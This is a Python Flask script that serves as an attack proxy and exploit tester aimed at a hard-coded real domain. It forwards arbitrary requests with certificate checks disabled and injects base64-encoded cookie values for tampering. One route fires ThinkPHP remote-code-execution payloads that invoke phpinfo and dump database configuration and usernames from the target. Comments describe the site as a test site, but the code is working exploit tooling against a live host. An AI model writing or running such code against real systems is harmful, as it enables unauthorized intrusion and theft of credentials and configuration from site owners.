from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
import base64

app = Flask(__name__, static_folder='.')
CORS(app)

TARGET = "https://goldmedal.cc"

# Serve your HTML file
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# Proxy any request to your test site
@app.route('/proxy', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy():
    path = request.args.get('path', '/')
    url = f"{TARGET}/{path.lstrip('/')}"
    
    headers = dict(request.headers)
    headers.pop('Host', None)  # Remove conflicting header
    
    cookies = {}
    if 'custom_cookie' in request.args:
        encoded = base64.b64encode(request.args['custom_cookie'].encode()).decode()
        cookies['username'] = encoded
    
    try:
        if request.method == 'GET':
            resp = requests.get(url, headers=headers, cookies=cookies, 
                              allow_redirects=False, verify=False, timeout=10)
        elif request.method == 'POST':
            resp = requests.post(url, headers=headers, cookies=cookies,
                               data=request.get_data(), allow_redirects=False,
                               verify=False, timeout=10)
        else:
            resp = requests.request(request.method, url, headers=headers,
                                  cookies=cookies, data=request.get_data(),
                                  allow_redirects=False, verify=False, timeout=10)
        
        return jsonify({
            'status_code': resp.status_code,
            'headers': dict(resp.headers),
            'body': resp.text[:5000],  # Limit response size
            'length': len(resp.text)
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Direct test for ThinkPHP RCE
@app.route('/test/thinkphp-rce')
def test_rce():
    payloads = [
        "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
        "/index.php?s=index/think\\config/get&name=database",
        "/index.php?s=index/think\\config/get&name=database.username",
    ]
    results = []
    for p in payloads:
        try:
            r = requests.get(f"{TARGET}{p}", timeout=10, verify=False)
            results.append({
                'payload': p,
                'status': r.status_code,
                'length': len(r.text),
                'snippet': r.text[:500]
            })
        except Exception as e:
            results.append({'payload': p, 'error': str(e)})
    return jsonify(results)

# Test cookie manipulation
@app.route('/test/cookie/<value>')
def test_cookie(value):
    encoded = base64.b64encode(value.encode()).decode()
    r = requests.get(f"{TARGET}/index.php", 
                     cookies={'username': encoded},
                     timeout=10, verify=False)
    return jsonify({
        'value_tested': value,
        'encoded_cookie': encoded,
        'status': r.status_code,
        'length': len(r.text),
        'different_from_default': len(r.text) != 0  # adjust based on baseline
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
